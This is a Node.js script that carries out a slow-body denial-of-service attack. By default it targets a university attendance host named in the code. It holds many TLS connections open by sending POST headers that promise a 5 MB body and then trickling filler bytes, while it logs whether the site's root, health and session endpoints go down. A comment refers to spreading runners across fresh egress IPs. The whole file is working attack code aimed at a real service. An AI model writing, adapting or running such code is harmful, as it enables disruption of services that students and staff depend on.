// One runner = one fresh egress IP. Holds N stalled bodies, probes victim paths.
import tls from "node:tls";
import { writeFileSync, appendFileSync } from "fs";
const H = process.env.HOST || "attendance.knust.edu.gh";
const N = parseInt(process.env.N || "0");
const DUR = parseInt(process.env.DUR || "90");
const TAG = process.env.TAG || "x";
const socks = []; let up = 0;
const out = (o) => { const l = JSON.stringify({ tag: TAG, ...o }); console.log(l); appendFileSync(`log-${TAG}.txt`, l + "\n"); };
const pr = async (p) => { const t = Date.now(); try { const r = await fetch(`https://${H}${p}`, { signal: AbortSignal.timeout(7000) }); const b = await r.text(); return { s: r.status, ms: Date.now() - t, b: b.slice(0, 40).replace(/\s+/g, " ") }; } catch (e) { return { s: "DOWN", ms: Date.now() - t, e: e.cause?.code || e.name }; } };
function sp() { const s = tls.connect({ host: H, port: 443, servername: H, rejectUnauthorized: false }, () => { up++; try { s.write(`POST /api/sessions/11111111-1111-4111-8111-111111111111/attend/ HTTP/1.1\r\nHost: ${H}\r\nContent-Type: multipart/form-data; boundary=--x\r\nContent-Length: 5242880\r\nConnection: keep-alive\r\n\r\n------x\r\n`); } catch {} }); s.on("error", () => {}); s.setNoDelay(true); setInterval(() => { if (!s.destroyed) try { s.write(Buffer.alloc(64, 0x41)); } catch {} }, 5000); socks.push(s); }
let i = 0; if (N > 0) { const iv = setInterval(() => { if (i++ < N) sp(); else clearInterval(iv); }, 25); }
const t0 = Date.now();
out({ phase: "start", n: N, dur: DUR });
const iv2 = setInterval(async () => {
  const rec = { t: ((Date.now() - t0) / 1000) | 0, up, live: socks.filter(s => !s.destroyed).length };
  rec.root = (await pr("/")); rec.health = (await pr("/api/health")); rec.info = (await pr("/api/sessions/11111111-1111-4111-8111-111111111111/info"));
  out(rec);
  if (((Date.now() - t0) / 1000 | 0) >= DUR) { clearInterval(iv2); socks.forEach(s => { try { s.destroy(); } catch {} }); setTimeout(() => process.exit(0), 500); }
}, 10000);
